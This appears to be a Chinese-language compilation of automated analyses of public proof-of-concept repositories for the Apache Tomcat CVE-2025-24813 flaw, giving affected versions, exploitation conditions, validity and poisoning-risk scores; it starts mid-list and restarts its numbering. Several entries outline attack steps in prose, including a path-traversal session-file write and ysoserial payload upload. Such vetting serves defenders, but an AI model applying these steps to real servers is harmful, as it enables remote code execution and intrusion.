2.  **生成 Payload：** 使用 ysoserial 工具生成包含恶意命令的反序列化 payload。POC 代码支持批量生成不同 gadget chain 的 payload，提高成功率。
3.  **PUT 请求：** 通过 PUT 请求，将生成的 payload 分段上传到目标 Tomcat 服务器。利用 Content-Range 头部模拟 partial PUT 请求。
4.  **GET 请求：** 通过 GET 请求，触发 Tomcat 对上传文件的反序列化操作，从而执行恶意代码。
5.  **执行命令：** 成功利用漏洞后，攻击者可以在目标服务器上执行任意命令。

**项目地址:** [tonyarris/CVE-2025-24813-PoC](https://github.com/tonyarris/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #48

**来源**: [CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md](../2025/CVE-2025-24813-u238_Tomcat-CVE_2025_24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 默认Servlet开启写入(disabled by default), 支持partial PUT(enabled by default), application 使用了Tomcat基于文件的session持久化，使用了默认的存储位置，并且application包含可被反序列化攻击利用的library。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，可能导致远程代码执行和/或信息泄露。该漏洞的根源在于对文件名的处理方式，特别是内部点（'file.Name'）。

**漏洞利用方式分析：**

根据漏洞库信息和搜索结果，该漏洞存在两种利用方式：

1.  **信息泄露/恶意内容注入：** 如果满足以下条件，攻击者能够查看敏感文件或注入恶意内容：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   目标URL是公共上传URL的子目录。
    *   攻击者知道敏感文件名。
    *   使用 partial PUT 上传敏感文件。

2.  **远程代码执行（RCE）：** 如果满足以下条件，攻击者能够执行任意代码：
    *   默认Servlet开启写入。
    *   支持partial PUT。
    *   应用程序使用Tomcat的基于文件的session持久化，并使用默认存储位置。
    *   应用程序包含一个可以用于反序列化攻击的library。

**POC 代码分析：**

POC代码`CVE_2025_24813.py`实现了以下功能：

1.  **检查Servlet是否可写：** 使用PUT请求向目标URL上传文件，检查HTTP响应状态码，以确定服务器是否允许写入。
2.  **生成ysoserial payload：** 使用ysoserial工具生成反序列化payload，需要指定命令、ysoserial路径和gadget。
3.  **生成Java payload：**  生成一个简单的java文件, 然后通过javac编译为class文件, 再打包为jar文件。
4.  **上传和验证payload：** 上传生成的payload到Tomcat服务器, 利用路径穿越漏洞，覆盖session文件，从而执行代码。

**有效性评估：**

根据搜索结果，CVE-2025-24813漏洞正在被积极利用。POC代码涵盖了漏洞利用的关键步骤，包括写入性验证、payload生成和上传，因此可以认为是有效的，但利用成功与否取决于目标环境是否满足利用条件。

**投毒风险评估：**

通过分析POC代码，发现存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖外部工具ysoserial：**  POC代码依赖于ysoserial工具生成反序列化payload。虽然ysoserial是一个常用的漏洞利用工具，但如果用户下载了被篡改的ysoserial版本，可能会执行恶意代码。虽然POC本身没有直接植入恶意代码，但依赖的外部资源存在被投毒的风险。
2.  **执行任意命令：**  该脚本允许执行任意命令。如果攻击者控制了用户运行脚本的环境，可以修改脚本，执行恶意的系统命令，从而控制目标系统。

综合考虑，该POC代码的投毒风险较低，约为5%。大部分代码是用于漏洞利用，风险主要来源于对外部依赖的信任和对执行环境的控制。


**项目地址:** [u238/Tomcat-CVE_2025_24813](https://github.com/u238/Tomcat-CVE_2025_24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #49

**来源**: [CVE-2025-24813-uzairhaider502_CVE-2025-24813.md](../2025/CVE-2025-24813-uzairhaider502_CVE-2025-24813.md)

# CVE-2025-24813

> 📦 该CVE有 **52** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-24813-137f_Poc-CVE-2025-24813.md](../2025/CVE-2025-24813-137f_Poc-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 远程代码执行/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** 默认Servlet开启写入(默认关闭), 开启Partial PUT (默认开启), 应用使用基于文件的session持久化(默认位置), 应用包含可用于反序列化攻击的库

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个漏洞，利用了路径等价性（内部点，例如 `file.Name`）结合启用了写入功能的默认 Servlet 和 Partial PUT 功能。该漏洞可能导致远程代码执行（RCE）、信息泄露或将恶意内容添加到上传的文件中。

**漏洞利用方式:**

1.  **前提条件:** 漏洞利用需要满足以下条件：
    *   默认 Servlet 开启写入 (disabled by default).
    *   支持 Partial PUT (enabled by default).
    *   对于RCE，应用需要使用 Tomcat 基于文件的 session 持久化，并且包含一个可以被反序列化攻击利用的库（例如，存在于classpath中的commons-collections）。
    *   对于信息泄露/文件篡改，需要攻击者了解敏感文件的上传目标 URL 位于公共上传目标 URL 的子目录下，且攻击者需要知道上传的敏感文件名，且敏感文件通过partial PUT上传。
2.  **漏洞利用步骤:**
    *   **获取 Session ID:** 攻击者首先需要获取一个有效的 JSESSIONID，可以通过访问 `/index.jsp` 获取，如果无法获取则使用默认值。
    *   **测试 PUT 方法:** 攻击者发送一个 PUT 请求来确认目标服务器是否允许使用 `Content-Range` 进行部分写入。
    *   **生成 Payload:**  攻击者使用 `ysoserial` 或者 Java 代码生成一个恶意的序列化对象。`ysoserial` 通过指定的 gadget（例如 `CommonsCollections6`）来执行命令。也可以生成一个包含恶意命令执行的Java .jar文件。
    *   **上传 Payload:**  攻击者利用路径遍历将 payload 上传到 Tomcat 的 session 目录。例如，`/uploads/../sessions/{JSESSIONID}.session`。
    *   **触发执行:**  攻击者使用包含恶意 JSESSIONID 的请求来访问应用程序。Tomcat 将会反序列化该 session 文件，从而执行攻击者注入的命令。

**有效性:**

根据漏洞库信息、搜索结果和提供的漏洞利用代码，该漏洞的 POC 代码**有效**。搜索结果中提到了该漏洞已被积极利用。提供的 POC 代码包含利用该漏洞进行 RCE 的 Python 脚本，并提供了详细的利用步骤和参数说明。

**投毒风险:**

评估提供的 POC 代码，投毒风险较低，约为 **10%**。主要考虑因素如下：

*   **代码结构:** 代码结构较为清晰，主要分为获取 Session ID、验证 PUT 方法、生成 Payload 和发送 Payload 等几个模块。
*   **依赖项:**  代码依赖 `ysoserial.jar`，这本身是一个已知的漏洞利用工具，如果攻击者替换了 `ysoserial.jar` 文件，则可能引入恶意代码。此外，java payload方式需要服务器具有java编译环境。
*   **潜在风险:**  `java_payload` 函数中使用 `Runtime.getRuntime().exec(c)` 直接执行命令，如果命令字符串 `cmd` 构造不当，可能会存在命令注入的风险。
*   **作者声明:**  README 文件中包含免责声明，说明该代码仅用于教育目的，这在一定程度上降低了作者进行恶意投毒的可能性。

总的来说，虽然代码本身看起来没有明显的恶意行为，但仍然需要谨慎使用，并确保从可信的来源获取 `ysoserial.jar`，并仔细检查命令字符串，避免引入额外的安全风险。 java payload方式需要服务器具有java编译环境,具有一定局限性。

**项目地址:** [137f/Poc-CVE-2025-24813](https://github.com/137f/Poc-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #2

**来源**: [CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md](../2025/CVE-2025-24813-Alaatk_CVE-2025-24813-POC.md)

## CVE-2025-24813 Apache Tomcat 远程代码执行/信息泄露/文件篡改

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露/文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露，文件被篡改

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 需要满足特定配置条件，包括启用Default Servlet的写入功能，启用partial PUT支持，存在安全敏感文件上传的目标URL位于公共上传目标URL的子目录中，攻击者已知安全敏感文件的名称，以及安全敏感文件通过partial PUT上传。或者，启用Default Servlet的写入功能，启用partial PUT支持，应用程序使用Tomcat基于文件的会话持久性与默认存储位置，应用程序包含一个可以在反序列化攻击中利用的库。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

根据漏洞库信息，CVE-2025-24813 涉及 Apache Tomcat 的路径等效问题，可能导致远程代码执行、信息泄露或恶意内容添加到上传的文件中。利用条件包括Default Servlet启用了写入，支持partial PUT，以及应用程序的特定配置。搜索引擎结果显示，该漏洞已被公开并被积极利用。

提供的 POC 代码尝试利用该漏洞。它首先使用 `argparse` 处理目标 URL 参数。然后，它包含一段 base64 编码的 payload，该 payload 是一个经过序列化的 Java 对象，旨在执行命令 `touch /tmp/RCE-success`。  该脚本将解码后的payload保存到`decoded_chain.bin`文件中。 然后，使用 `requests.put` 函数，通过构造包含 'Content-Range' 头部的 PUT 请求，利用 Tomcat 的 partial PUT 功能，将payload上传到目标服务器。PUT请求的目标URL是`TARGET_IP/payload.session`。脚本上传完成后删除临时文件。 最后使用Cookie进行getSession。

**有效性评估：** POC 的有效性取决于目标 Tomcat 服务器是否满足漏洞利用的全部条件。如果 Default Servlet 的写入已启用，并且启用了 partial PUT 支持，并且满足其他条件，则 POC 可能有效。

**投毒风险评估：** 仔细检查提供的 POC 代码，没有发现明显的投毒代码。该代码旨在利用已知的 Tomcat 漏洞，而不是在目标系统上植入后门或执行恶意操作。 代码中包含的base64编码的payload部分是最有可能存在风险的部分，但是payload中的命令是`touch /tmp/RCE-success`，该命令仅仅是创建一个文件，用于验证漏洞是否存在，并非恶意操作。

**利用方式总结：**

1.  **条件确认:** 确认目标 Tomcat 服务器启用了 Default Servlet 的写入功能，并启用了 partial PUT 支持，以及是否满足其他相关条件。
2.  **Payload 生成:**  生成一个恶意 Java 序列化对象，该对象可以执行任意代码，或者读取敏感文件。
3.  **Partial PUT 上传:**  使用 HTTP PUT 请求，通过设置 `Content-Range` 头部，将恶意 payload 分块上传到目标服务器上的特定路径（例如，`payload.session`）。
4.  **触发反序列化：**  Tomcat 尝试反序列化上传的文件，从而触发恶意代码的执行。


**项目地址:** [Alaatk/CVE-2025-24813-POC](https://github.com/Alaatk/CVE-2025-24813-POC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #3

**来源**: [CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md](../2025/CVE-2025-24813-AlperenY-cs_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行、信息泄露和恶意内容注入

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 需要满足多个条件，包括：默认Servlet开启写入 (默认关闭)，支持Partial PUT (默认开启)，存在安全敏感文件的目标URL是公共上传目标URL的子目录，攻击者知晓敏感文件名，安全敏感文件通过Partial PUT上传，或应用程序使用Tomcat文件会话持久性（默认位置），应用程序包含可用于反序列化攻击的库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价性漏洞。该漏洞允许攻击者通过精心构造的包含内部点（file.Name）的文件名，利用默认Servlet中启用的写入功能和Partial PUT支持，进行远程代码执行、信息泄露和恶意内容注入。根据漏洞描述，攻击成功的关键在于Tomcat的配置以及应用程序是否使用了易受攻击的组件。

**有效性：** 从搜索结果来看，该漏洞已被确认存在并且有在野利用。但是，漏洞利用需要满足多个非默认配置条件，因此并非所有Tomcat实例都易受攻击。提供的POC代码 `/tmp/9a20e2370d216dc00af3f4d6145c600e/README.md` 内容过于简单，仅包含CVE编号，并不能直接用于漏洞利用，需要根据具体情况编写特定的利用代码，例如构造恶意的PUT请求。

**投毒风险：** 提供的POC代码非常简单，主要就是包含 CVE-2025-24813 的 README.md 文件。因此，投毒风险很低，但是不排除作者在其他相关文件中隐藏恶意代码的可能性，只是没有在此次提交中呈现，考虑到文件数量极少,故判断存在10%的投毒风险。

**利用方式：** 漏洞利用主要通过以下步骤：

1.  **利用Partial PUT上传恶意文件：** 攻击者构造包含内部点的文件名，并通过Partial PUT请求将其上传到目标服务器。
2.  **绕过路径检查：** 由于路径等价性问题，Tomcat可能无法正确处理包含内部点的文件名，导致绕过路径检查。
3.  **信息泄露/恶意内容注入：** 如果目标是信息泄露或恶意内容注入，攻击者需要知道目标敏感文件的名称和路径，然后通过覆盖或修改该文件来实现目的。
4.  **远程代码执行：** 如果应用程序使用了Tomcat的文件会话持久性，并且包含可用于反序列化攻击的库，攻击者可以利用该漏洞将恶意序列化对象写入会话文件，从而实现远程代码执行。攻击者可能会覆盖session文件，然后触发反序列化。

**总结：** CVE-2025-24813 是一个高危漏洞，但是利用条件较为苛刻。 提供的POC代码过于简单，无法直接用于攻击，需要根据目标环境进行定制。在实际环境中，需要仔细评估Tomcat的配置和应用程序的安全性，以确定是否存在被利用的风险。同时需要关注针对该漏洞的攻击尝试并及时采取缓解措施，例如禁用默认Servlet的写入功能或升级到修复版本。

**项目地址:** [AlperenY-cs/CVE-2025-24813](https://github.com/AlperenY-cs/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #4

**来源**: [CVE-2025-24813-AsaL1n_CVE-2025-24813.md](../2025/CVE-2025-24813-AsaL1n_CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat 路径等价性漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 内容篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危 (取决于配置和利用方式，可能导致RCE、敏感信息泄露或文件内容篡改)

**影响版本:** Apache Tomcat 9.0.0.M1 - 9.0.98, 10.1.0-M1 - 10.1.34, 11.0.0-M1 - 11.0.2

**利用条件:** RCE需要满足以下条件：writes enabled for default servlet, support for partial PUT, 使用Tomcat文件session持久化默认位置, 应用包含可被反序列化攻击利用的库。信息泄露/内容篡改需要满足以下条件：writes enabled for default servlet, support for partial PUT, security sensitive上传URL是公共上传URL的子目录, 攻击者知道security sensitive文件的名字, security sensitive文件也是通过partial PUT上传。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813 是一个Apache Tomcat中的路径等价性漏洞，源于对文件名中内部点（'file.Name'）处理不当。根据漏洞描述和搜索结果，此漏洞在特定配置下可能导致远程代码执行（RCE）、信息泄露或恶意内容被添加到上传文件中。

**有效性：**
根据搜索引擎结果和漏洞描述，该漏洞已被积极利用。提供的PoC代码利用了Tomcat的partial PUT特性以及session持久化机制（在满足一定条件下），尝试通过上传恶意序列化数据来实现RCE。

**利用方式：**
1.  **前提条件：**
    *   Tomcat的default servlet需要开启写入功能（默认关闭）。
    *   需要启用partial PUT支持（默认开启）。
    *   （RCE）应用使用Tomcat的文件session持久化，且为默认存储位置。
    *   （RCE）应用包含可被反序列化攻击利用的库，例如存在fastjson, jackson等。
    *   （信息泄露/内容篡改）存在安全敏感文件上传URL是公共上传URL的子目录， 且攻击者知道该敏感文件名。
2.  **攻击步骤：**
    *   攻击者构造一个恶意的序列化对象，对其进行Base64编码（PoC中`-d/--data` 参数）。
    *   攻击者指定目标URL（PoC中`-u/--url` 参数）。
    *   PoC脚本首先向目标URL发送PUT请求，其中`Content-Range`头指定了上传的范围，利用Tomcat的partial PUT特性。
    *   如果服务器返回409状态码，则表示partial PUT已成功处理。
    *   之后，PoC脚本会发送GET请求，并携带包含恶意序列化数据的JSESSIONID cookie（`.{random_str}`）。
    *   Tomcat反序列化session数据，从而触发RCE (如果满足RCE条件)。

**投毒风险：**
分析提供的PoC代码和Readme，可以发现：
*   脚本本身的功能是利用漏洞进行攻击。
*   脚本中没有发现明显的恶意代码，例如植入后门、篡改系统文件等。
*   脚本需要用户提供Base64编码的序列化数据，这意味着攻击者需要自行生成payload，脚本只是负责发送payload。
*   Readme中指明了利用方式及所需条件，较为详细。

因此，该仓库中存在作者隐藏的恶意代码的可能性较低，但不能完全排除。投毒风险评估为 10%。风险主要在于用户可能下载了被篡改过的poc，或者运行了来历不明的payload, 这些payload可能包含恶意行为。

**项目地址:** [AsaL1n/CVE-2025-24813](https://github.com/AsaL1n/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #5

**来源**: [CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md](../2025/CVE-2025-24813-B1gN0Se_Tomcat-CVE-2025-24813.md)

## CVE-2025-24813 - Apache Tomcat RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行 (RCE) / 信息泄露 / 文件篡改

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行，信息泄露和文件被恶意修改

**影响版本:** 9.0.0.M1 <= Apache Tomcat <= 9.0.98, 10.1.0-M1 <= Apache Tomcat <= 10.1.34, 11.0.0-M1 <= Apache Tomcat <= 11.0.2

**利用条件:** DefaultServlet 写入功能启用 (readonly=false), Partial PUT 请求支持 (Tomcat 默认支持), 文件会话持久化启用 (context.xml 配置 PersistentManager 和 FileStore), 存在反序列化利用链 (类路径下包含存在漏洞的库)

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，该漏洞源于 'file.Name' (内部点) 的处理不当。如果满足以下所有条件，则可能导致远程代码执行，信息泄露或文件篡改：

1.  **DefaultServlet 写入功能启用：** 必须在 `web.xml` 中配置 `readonly=false`，允许 DefaultServlet 写入文件。
2.  **Partial PUT 请求支持：** Tomcat 默认支持分块上传，允许攻击者通过分块上传恶意文件。
3.  **文件会话持久化启用：** 需要在 `context.xml` 中配置 `PersistentManager` 和 `FileStore`，启用基于文件的会话存储。
4.  **存在反序列化利用链：** 类路径下需要包含存在漏洞的库（例如，`commons-collections-3.2.1.jar`），使得攻击者可以通过反序列化漏洞执行任意代码。
5.  **信息泄露/文件篡改的先决条件:** 除了上述条件外，还需要满足：writes enabled for the default servlet, support for partial PUT, a target URL for security sensitive uploads that was a sub-directory of a target URL for public uploads, attacker knowledge of the names of security sensitive files being uploaded, the security sensitive files also being uploaded via partial PUT

**利用方式：**

1.  攻击者首先利用 Partial PUT 请求上传一个恶意构造的序列化对象，该对象包含一个反序列化利用链（例如，使用 Commons Collections）。
2.  由于启用了 DefaultServlet 的写入功能，恶意文件可以被写入到 Tomcat 的会话存储目录中。
3.  当 Tomcat 尝试反序列化该会话时，由于存在利用链，攻击者可以执行任意代码。
4. 若目标满足信息泄露/文件篡改的先决条件,攻击者可以通过构造恶意的Partial PUT请求，利用路径等价绕过限制，最终实现信息泄露或者文件篡改

**投毒风险分析：**

该POC代码提供了一个 Docker Compose 文件，用于搭建易受攻击的 Tomcat 环境。该环境配置了必要的组件（DefaultServlet 写入，Partial PUT，文件会话持久化），并且包含了一个 Commons Collections 库，可以用于反序列化攻击。

代码本身看起来是直接了当的漏洞演示。投毒风险较低，但是使用该POC时仍需注意。

**有效性分析：**

根据漏洞库信息、搜索结果以及提供的利用代码来看，该漏洞已经确认被利用，并且相关的利用方式和利用条件已经比较清晰。提供的POC代码针对的是 RCE 部分，有效性较高，但成功利用取决于是否满足所有前提条件。

**项目地址:** [B1gN0Se/Tomcat-CVE-2025-24813](https://github.com/B1gN0Se/Tomcat-CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #6

**来源**: [CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md](../2025/CVE-2025-24813-CEAlbez_CVE-2025-24813-PoC.md)

## CVE-2025-24813 - Apache Tomcat Path Equivalence/Partial PUT RCE/信息泄露

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/Partial PUT远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= 9.0.98, 10.1.0-M1 <= 10.1.34, 11.0.0-M1 <= 11.0.2

**利用条件:** 需要满足多个条件：默认Servlet启用写入(默认禁用)，启用Partial PUT(默认启用)，目标URL是公共上传URL的子目录，攻击者知道敏感文件名，并且通过Partial PUT上传敏感文件。RCE还需要应用程序使用Tomcat的文件会话持久性，以及存在可利用的反序列化库。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-24813是Apache Tomcat中的一个路径等价漏洞，结合启用了写入功能的默认Servlet和Partial PUT功能，可能导致远程代码执行和敏感信息泄露。漏洞利用方式如下：

1.  **信息泄露/内容注入:** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   目标URL是公共上传URL的子目录
    *   攻击者知道敏感文件名
    *   通过Partial PUT上传敏感文件
攻击者可以查看敏感文件或向其中注入恶意内容。

2.  **远程代码执行 (RCE):** 如果满足以下条件：
    *   默认Servlet启用写入（默认禁用）
    *   启用Partial PUT（默认启用）
    *   应用程序使用Tomcat的文件会话持久性，且使用默认存储位置
    *   应用程序包含可利用的反序列化库
攻击者可以通过上传恶意序列化session文件，利用反序列化漏洞执行任意代码。

**有效性：**
根据搜索结果，CVE-2025-24813漏洞存在活跃的利用。PoC代码的README描述了一个基本的利用流程，包括克隆仓库、安装依赖、运行PoC脚本，表明该PoC可能有效，但具体利用成功与否取决于目标环境的配置是否满足漏洞利用条件。PoC的有效性较高，因为搜索结果显示该漏洞正在被积极利用。

**投毒风险：**
分析提供的PoC代码（README.md），投毒风险较低。README.md文件只包含漏洞描述、环境配置、使用方法和免责声明。虽然PoC代码没有直接展示`poc.py`的内容，但是根据描述`poc.py`脚本会提示用户输入目标URL，表明其功能是针对目标进行漏洞验证而非植入后门。当然，`poc.py`本身可能包含恶意代码。在没有查看 `poc.py` 的内容的情况下，预估`poc.py`存在投毒代码的可能性较低，大约10%。主要考虑到以下几点：

*   PoC旨在验证漏洞的存在，而非长期控制目标系统。
*   公开的PoC代码通常会接受安全社区的审查，增加投毒的难度。
*   作者声明仅用于教育和研究目的。

**利用方式总结：**
攻击者利用此漏洞的方式是，首先需要满足前置条件（Default Servlet开启写入、Partial PUT启用等）。然后，通过构造恶意的PUT请求，并利用路径等价，覆盖或者修改敏感文件，实现信息泄露或RCE。RCE场景依赖于反序列化漏洞的利用，需要上传精心构造的恶意序列化数据。

**项目地址:** [CEAlbez/CVE-2025-24813-PoC](https://github.com/CEAlbez/CVE-2025-24813-PoC)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #7

**来源**: [CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md](../2025/CVE-2025-24813-Eduardo-hardvester_CVE-2025-24813.md)

## CVE-2025-24813-Apache Tomcat-路径遍历/反序列化RCE

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径遍历/反序列化RCE

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 11.0.0-M1 <= version <= 11.0.2, 10.1.0-M1 <= version <= 10.1.34, 9.0.0.M1 <= version <= 9.0.98

**利用条件:** 1. 默认Servlet开启了写入 (默认禁用)
2. 支持Partial PUT (默认启用)
3. 应用使用Tomcat基于文件的Session持久化, 使用默认存储位置
4. 应用包含可被反序列化攻击利用的库

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞，攻击者可以利用 'file.Name' (内部点) 来实现远程代码执行和/或信息泄露，以及/或通过启用了写入的默认 Servlet 向上传的文件添加恶意内容。

**漏洞利用方式：**
1.  **信息泄露/恶意内容添加：**  如果满足以下条件，攻击者可以查看安全敏感文件或向其中注入内容：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者知道要上传的安全敏感文件的名称。
    *   通过 Partial PUT 上传安全敏感文件。

2.  **远程代码执行：**  如果满足以下条件，攻击者可以执行远程代码：
    *   默认 Servlet 启用了写入（默认禁用）。
    *   支持 Partial PUT（默认启用）。
    *   应用程序使用 Tomcat 的基于文件的会话持久性，并且使用默认的存储位置。
    *   应用程序包含一个可以用于反序列化攻击的库。

**POC分析：**
POC利用脚本`CVE_2025_24813.py`的利用流程大概如下：
1.  检查目标服务器的默认servlet是否开启PUT方法，主要通过PUT请求上传一个文件来判断.
2.  如果目标开启了PUT方法，则会生成一个ysoserial的payload，指定gadget和要执行的命令.
3.  然后将payload上传到`target_url/uploads/../sessions/{session_id}.session`，session_id是由参数指定

**投毒风险分析：**
*   脚本主要功能是漏洞利用，没有发现明显的恶意代码。
*   脚本会生成payload并上传，这个过程可能存在一定风险，但主要取决于执行的命令和payload的内容，而非脚本本身。
*  脚本中存在一些临时文件创建，然后删除的操作，例如`Exploit.java`, `Exploit.class`，这些是payload构造过程中的正常步骤，但如果删除失败，可能会在服务器上留下痕迹。
*  脚本有生成java payload的逻辑，但是java payload的生成是直接拼接字符串，命令在字符串中比较明显，不太容易做手脚。
*  考虑到ysoserial payload本身就可能被认为是具有潜在危害，因此将投毒风险评估为5%。主要是payload本身可能存在的潜在风险。

**结论：**
提供的POC代码看起来是有效的，如果目标环境满足漏洞利用的条件，可以成功执行命令。投毒风险较低，主要风险在于利用过程中生成的payload可能带来的危害。

**项目地址:** [Eduardo-hardvester/CVE-2025-24813](https://github.com/Eduardo-hardvester/CVE-2025-24813)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #8

**来源**: [CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md](../2025/CVE-2025-24813-Erosion2020_CVE-2025-24813-vulhub.md)

## CVE-2025-24813-Apache Tomcat 路径等价和反序列化漏洞

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 远程代码执行/信息泄露

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和敏感信息泄露

**影响版本:** 9.0.0.M1 <= version <= 9.0.98, 10.1.0-M1 <= version <= 10.1.34, 11.0.0-M1 <= version <= 11.0.2

**利用条件:** 写入已启用默认Servlet,支持部分PUT,针对敏感上传的URL是公共上传URL的子目录,攻击者了解正在上传的安全敏感文件的名称,安全敏感文件也通过部分PUT上传. 或 写入已启用默认Servlet,支持部分PUT,应用程序使用Tomcat基于文件的会话持久化，使用默认存储位置,应用程序包含可能在反序列化攻击中被利用的库

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2025-24813 是 Apache Tomcat 中的一个路径等价漏洞（CWE-44）和一个反序列化漏洞(CWE-502)。 根据漏洞库信息和搜索结果，漏洞利用涉及利用 Tomcat 默认 Servlet 的写入功能和部分 PUT 请求处理机制中的缺陷。 

**有效性分析：**
 根据搜索结果，CVE-2025-24813 漏洞已被积极利用。 多个来源（Rapid7, Recorded Future, Akamai, Zscaler, 西オアフ大学, XM Cyber, SonicWall, Esri）证实了这一点。Unit42 的报告也提供了测试该漏洞的信息。 提供的 POC 代码描述简单，是 vulhub 环境的搭建说明，但考虑到其他来源指出漏洞已被积极利用，可以认为存在可用的利用代码。

**投毒风险分析：**
 POC代码仅提供了一个用于搭建vulhub环境的README文档，内容非常简单，只包含 CVE-2025-24813 的 vulhub 环境的 POC 脚本说明。 这种情况下，作者进行恶意代码投毒的可能性很低。 因此，投毒风险评估为1%。

**利用方式分析：**
 根据漏洞描述，存在两种主要的利用方式：
 1. **信息泄露/恶意内容注入：** 如果满足以下所有条件，攻击者能够查看安全敏感文件和/或将内容注入这些文件：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   安全敏感上传的目标 URL 是公共上传目标 URL 的子目录。
    *   攻击者了解正在上传的安全敏感文件的名称。
    *   安全敏感文件也通过部分 PUT 上传。
 2.  **远程代码执行：** 如果满足以下所有条件，攻击者能够执行远程代码：
    *   写入已启用默认 Servlet（默认禁用）。
    *   支持部分 PUT（默认启用）。
    *   应用程序使用 Tomcat 基于文件的会话持久化，使用默认存储位置。
    *   应用程序包含可能在反序列化攻击中被利用的库。

总而言之，漏洞利用依赖于对 Tomcat 服务器的配置和应用程序的特定环境的利用，包括启用的写入权限、对部分 PUT 请求的支持以及应用程序中存在的潜在反序列化漏洞。

**项目地址:** [Erosion2020/CVE-2025-24813-vulhub](https://github.com/Erosion2020/CVE-2025-24813-vulhub)

**漏洞详情:** [CVE-2025-24813](https://nvd.nist.gov/vuln/detail/CVE-2025-24813)

---

## POC #9

**来源**: [CVE-2025-24813-FY036_cve-2025-24813_poc.md](../2025/CVE-2025-24813-FY036_cve-2025-24813_poc.md)

## CVE-2025-24813-Apache Tomcat-路径等价/反序列化

**漏洞编号:** CVE-2025-24813

**漏洞类型:** 路径等价/反序列化

**影响应用:** Apache Tomcat

**危害等级:** 高危，可能导致远程代码执行和信息泄露

